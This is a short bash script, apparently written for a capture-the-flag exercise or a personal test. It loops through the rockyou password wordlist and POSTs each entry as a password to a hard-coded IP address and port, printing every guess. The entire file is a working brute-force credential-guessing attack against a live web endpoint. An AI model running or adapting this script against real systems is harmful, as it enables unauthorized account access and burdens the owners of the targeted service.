#!/bin/bash

while read pw; do
  curl -s -d "password=$pw" http://184.72.154.227:7881/
  echo "$pw"
done </Users/asmolich/dev/wordlists/rockyou/rockyou.txt

